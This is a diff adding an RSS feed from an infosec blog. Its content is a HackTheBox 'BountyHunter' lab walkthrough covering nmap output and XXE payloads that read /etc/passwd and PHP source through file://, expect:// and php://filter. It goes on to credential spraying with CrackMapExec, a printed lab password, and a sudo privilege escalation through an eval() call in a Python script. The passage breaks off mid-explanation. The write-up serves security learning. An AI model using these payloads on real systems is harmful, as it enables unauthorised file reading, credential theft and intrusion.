@@ -1,0 +1,1066 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>hackthebox on Yet, another infosec blog</title>
+    <link>/tags/hackthebox/</link>
+    <description>Recent content in hackthebox on Yet, another infosec blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Sun, 03 Oct 2021 09:30:00 +1345</lastBuildDate><atom:link href="/tags/hackthebox/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>HackTheBox: BountyHunter</title>
+      <link>/posts/htb-bountyhunter/</link>
+      <pubDate>Sun, 03 Oct 2021 09:30:00 +1345</pubDate>
+      
+      <guid>/posts/htb-bountyhunter/</guid>
+      <description>Today, we are delving into BountyHunter as another HackTheBox machine in our sidetrack series.
+I hope you have a nice weekend and without further ado, let us jump right in!
+Enumeration Nmap output ┌──(kali㉿kali)-[~/Desktop/HTB/Boxes/BountyHunter] └─$ cat nmap/BountyHunter.nmap # Nmap 7.91 scan initiated Sat Oct 2 22:12:07 2021 as: nmap -sS -sV -sC -p- -v -oA nmap/BountyHunter 10.10.11.100 Nmap scan report for 10.10.11.100 Host is up (0.048s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.</description>
+      <content>&lt;p&gt;Today, we are delving into BountyHunter as another HackTheBox machine in our &lt;em&gt;sidetrack&lt;/em&gt; series.&lt;/p&gt;
+&lt;p&gt;I hope you have a nice weekend and without further ado, let us jump right in!&lt;/p&gt;
+&lt;h2 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h2&gt;
+&lt;h3 id=&#34;nmap-output&#34;&gt;Nmap output&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;kali㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/Desktop/HTB/Boxes/BountyHunter&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+└─$ cat nmap/BountyHunter.nmap 
+&lt;span style=&#34;color:#75715e&#34;&gt;# Nmap 7.91 scan initiated Sat Oct  2 22:12:07 2021 as: nmap -sS -sV -sC -p- -v -oA nmap/BountyHunter 10.10.11.100&lt;/span&gt;
+Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.10.11.100
+Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.048s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;65533&lt;/span&gt; closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu Linux; protocol 2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+| ssh-hostkey: 
+|   &lt;span style=&#34;color:#ae81ff&#34;&gt;3072&lt;/span&gt; d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;RSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|   &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ECDSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|_  &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ED25519&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+80/tcp open  http    Apache httpd 2.4.41 &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
+|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.41 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+|_http-title: Bounty Hunters
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Based on nmap result, Apache and SSH service were running on port 80 and 22, respectively.&lt;/p&gt;
+&lt;p&gt;The default index shows no conspicuous detail aside from its portal redirecting to a report form.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_15-34.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Initially, several XSS/SQLi payloads were tested but displayed incapable of producing any useful result, albeit the input values seemed not to be filtered or sanitized for special characters.&lt;/p&gt;
+&lt;h2 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h2&gt;
+&lt;h3 id=&#34;xml-eternal-entity&#34;&gt;XML Eternal Entity&lt;/h3&gt;
+&lt;p&gt;As the above solution is not possible, let us use BurpSuite to intercept requests and get a closer look.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_15-46.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;From here you can tell that the value of &lt;code&gt;data&lt;/code&gt; field is encoded, so I prefer using  &lt;a href=&#34;https://gchq.github.io/CyberChef/&#34;&gt;CyberChef&lt;/a&gt;, a powerful yet simple utility, to analyze and decode it.&lt;/p&gt;
+&lt;p&gt;Our recipe consists of &lt;strong&gt;URL Decode&lt;/strong&gt; and &lt;strong&gt;From Base64&lt;/strong&gt;, sequentially.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_15-48.png&#34; alt=&#34;Using Cyberchef to decode&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The output is of XML and thereby allowing us to interfere and view files on the target server filesystem as well as other back-end sources or external entities that the server itself can access. This is an XXE injection, a type of attack against an application that parses XML input.&lt;/p&gt;
+&lt;p&gt;You can read more about XXE &lt;a href=&#34;https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Thanks to that, we can make an attempt to trigger the XXE vulnerability. The following payload includes and shows us the &lt;code&gt;/etc/passwd&lt;/code&gt; on the server.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?xml  version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;ISO-8859-1&amp;#34;?&amp;gt;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!DOCTYPE foo [
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;  &amp;lt;!ELEMENT foo ANY &amp;gt;&lt;/span&gt;
+  &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!ENTITY xxe SYSTEM &amp;#34;file:///etc/passwd&amp;#34; &amp;gt;&lt;/span&gt;]&amp;gt;
+		&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;bugreport&amp;gt;&lt;/span&gt;
+		&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;&amp;amp;xxe;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
+		&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;cwe&amp;gt;&lt;/span&gt;x&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/cwe&amp;gt;&lt;/span&gt;
+		&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;cvss&amp;gt;&lt;/span&gt;x&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/cvss&amp;gt;&lt;/span&gt;
+		&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;reward&amp;gt;&lt;/span&gt;aaaa&amp;gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/reward&amp;gt;&lt;/span&gt;
+		&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/bugreport&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And the return is:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_15-50.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;In case the &lt;code&gt;expect://&lt;/code&gt; module is available on the target server then you can craft your payload as below and actually get RCE.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?xml  version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;ISO-8859-1&amp;#34;?&amp;gt;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!DOCTYPE foo [
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;  &amp;lt;!ELEMENT foo ANY &amp;gt;&lt;/span&gt;
+  &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!ENTITY xxe SYSTEM &amp;#34;expect://ls&amp;#34; &amp;gt;&lt;/span&gt;]&amp;gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!-- execute &amp;#34;ls&amp;#34; command --&amp;gt;&lt;/span&gt;
+		&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;bugreport&amp;gt;&lt;/span&gt;
+		&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;&amp;amp;xxe;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
+		&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;cwe&amp;gt;&lt;/span&gt;x&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/cwe&amp;gt;&lt;/span&gt;
+		&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;cvss&amp;gt;&lt;/span&gt;x&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/cvss&amp;gt;&lt;/span&gt;
+		&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;reward&amp;gt;&lt;/span&gt;aaaa&amp;gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/reward&amp;gt;&lt;/span&gt;
+		&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/bugreport&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Unfortunately, the result is just four empty fields, which indicates that &lt;code&gt;expect://&lt;/code&gt; is not loaded or this is a blind injection. Not really matter, though.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_15-51.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We still have another solution of using a PHP wrapper to retrieve back-end files on the server. If you still remember, we have already &lt;a href=&#34;https://legiahuyy.github.io/blog/en/RFI-Wrapper/&#34;&gt;used it&lt;/a&gt; in one of my university challenges.&lt;/p&gt;
+&lt;p&gt;So our new payload is as following:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?xml  version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;ISO-8859-1&amp;#34;?&amp;gt;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!DOCTYPE foo [
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;  &amp;lt;!ELEMENT foo ANY &amp;gt;&lt;/span&gt;
+  &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!ENTITY xxe SYSTEM &amp;#34;php://filter/convert.base64-encode/resource=index.php&amp;#34; &amp;gt;&lt;/span&gt;]&amp;gt;
+		&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;bugreport&amp;gt;&lt;/span&gt;
+		&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;&amp;amp;xxe;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
+		&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;cwe&amp;gt;&lt;/span&gt;x&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/cwe&amp;gt;&lt;/span&gt;
+		&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;cvss&amp;gt;&lt;/span&gt;x&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/cvss&amp;gt;&lt;/span&gt;
+		&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;reward&amp;gt;&lt;/span&gt;aaaa&amp;gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/reward&amp;gt;&lt;/span&gt;
+		&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/bugreport&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It reads and encodes &lt;code&gt;index.php&lt;/code&gt; on the server to a base64 string.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_15-58.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Yet it is just some HTML and CSS, nothing special so I have &lt;code&gt;gobuster&lt;/code&gt; enumerating &lt;code&gt;.php&lt;/code&gt; and other sensitive extensions.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_16-01.png&#34; alt=&#34;db.php&#34;&gt;&lt;/p&gt;
+&lt;p&gt;After retrieving &lt;code&gt;db.php&lt;/code&gt; and decoding the content, we have some credentials.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_16-04.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;But neither &lt;code&gt;test&lt;/code&gt; nor &lt;code&gt;admin&lt;/code&gt; was a valid username for SSH login, so I try looking for another user with console on the server system by searching for &lt;code&gt;/bin/bash&lt;/code&gt; or &lt;code&gt;/home/(username)&lt;/code&gt; in the &lt;code&gt;/etc/passwd&lt;/code&gt; file.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_16-08.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;There are just &lt;code&gt;root&lt;/code&gt; and &lt;code&gt;Development&lt;/code&gt;.&lt;/p&gt;
+&lt;h3 id=&#34;credentials-spraying-with-cme&#34;&gt;Credentials spraying with CME&lt;/h3&gt;
+&lt;p&gt;In this step, CrackMapExec (CME) should be able to help us get into the server internal. In order to work, CME needs two files containing all usernames and passwords (i.e, &lt;code&gt;user.txt&lt;/code&gt; and &lt;code&gt;pass.txt&lt;/code&gt;).&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_16-16.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;And the valid credentials are: &lt;code&gt;development:m19RoAU0hP41A1sTsq6K&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-10-03-HTB-BountyHunter/2021-10-03_16-18.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;privilege-escalation&#34;&gt;Privilege Escalation&lt;/h2&gt;
+&lt;p&gt;To know whether &lt;code&gt;development&lt;/code&gt; user is capable of executing command as superuser or not, try &lt;code&gt;$ sudo -l&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;development@bountyhunter:~$ sudo -l
+Matching Defaults entries &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; development on
+    bountyhunter:
+    env_reset, mail_badpass,
+    secure_path&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span style=&#34;color:#ae81ff&#34;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span style=&#34;color:#ae81ff&#34;&gt;\:&lt;/span&gt;/usr/sbin&lt;span style=&#34;color:#ae81ff&#34;&gt;\:&lt;/span&gt;/usr/bin&lt;span style=&#34;color:#ae81ff&#34;&gt;\:&lt;/span&gt;/sbin&lt;span style=&#34;color:#ae81ff&#34;&gt;\:&lt;/span&gt;/bin&lt;span style=&#34;color:#ae81ff&#34;&gt;\:&lt;/span&gt;/snap/bin
+
+User development may run the following commands on
+        bountyhunter:
+    &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;root&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/python3.8
+        /opt/skytrain_inc/ticketValidator.py
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As can be seen, &lt;code&gt;development&lt;/code&gt; can execute &lt;code&gt;/usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py&lt;/code&gt; as root without password.&lt;/p&gt;
+&lt;h3 id=&#34;eval--evil&#34;&gt;Eval() == Evil&lt;/h3&gt;
+&lt;p&gt;Reading &lt;code&gt;/opt/skytrain_inc/ticketValidator.py&lt;/code&gt; source.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#Skytrain Inc Ticket Validation System 0.1&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;#Do not distribute this file.&lt;/span&gt;
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;load_file&lt;/span&gt;(loc):
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; loc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;endswith(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.md&amp;#34;&lt;/span&gt;):
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; open(loc, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;r&amp;#39;&lt;/span&gt;)
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
+        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Wrong file type.&amp;#34;&lt;/span&gt;)
+        exit()
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;evaluate&lt;/span&gt;(ticketFile):
+    &lt;span style=&#34;color:#75715e&#34;&gt;#Evaluates a ticket to check for ireggularities.&lt;/span&gt;
+    code_line &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i,x &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; enumerate(ticketFile&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;readlines()):
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; x&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;startswith(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;# Skytrain Inc&amp;#34;&lt;/span&gt;):
+                &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;continue&lt;/span&gt;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; x&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;startswith(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;## Ticket to &amp;#34;&lt;/span&gt;):
+                &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
+            print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Destination: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join(x&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;)[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;:])&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;continue&lt;/span&gt;
+
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; x&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;startswith(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;__Ticket Code:__&amp;#34;&lt;/span&gt;):
+            code_line &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;continue&lt;/span&gt;
+
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; code_line &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; code_line:
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; x&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;startswith(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;**&amp;#34;&lt;/span&gt;):
+                &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
+            ticketCode &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; x&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;replace(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;**&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;+&amp;#34;&lt;/span&gt;)[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; int(ticketCode) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;:
+                validationNumber &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; eval(x&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;replace(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;**&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;))
+                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; validationNumber &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;:
+                    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
+                &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
+                    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;():
+    fileName &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; input(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Please enter the path to the ticket file.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+    ticket &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; load_file(fileName)
+    &lt;span style=&#34;color:#75715e&#34;&gt;#DEBUG print(ticket)&lt;/span&gt;
+    result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; evaluate(ticket)
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (result):
+        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Valid ticket.&amp;#34;&lt;/span&gt;)
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
+        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Invalid ticket.&amp;#34;&lt;/span&gt;)
+    ticket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close
+
+main()
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Code breakdown:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;load_file&lt;/code&gt; checks whether the file extension is &lt;code&gt;.md&lt;/code&gt; or not.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;evaluate&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
